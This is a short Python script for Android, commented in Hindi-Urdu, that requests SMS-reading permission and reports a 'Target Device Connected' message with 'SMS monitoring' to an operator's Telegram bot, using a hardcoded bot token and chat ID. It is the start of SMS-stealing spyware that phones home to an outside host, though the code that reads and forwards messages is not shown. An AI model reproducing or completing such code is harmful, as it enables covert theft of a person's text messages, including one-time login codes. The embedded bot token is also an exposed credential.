import requests
from android.permissions import request_permissions, Permission

# Aapka Data
TOKEN = "8264376885:AAG6pFOvdb_wcPboSz9-jooibI9FO9QILqY"
CHAT_ID = "8264376885" 

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        requests.post(url, data={"chat_id": CHAT_ID, "text": text})
    except:
        pass

def start_app():
    # Mobile permissions mangna
    request_permissions([Permission.READ_SMS, Permission.INTERNET])
    send_to_telegram("✅ Target Device Connected!\nApp Active aur SMS monitoring tayar hai.")

if __name__ == "__main__":
    start_app()
  
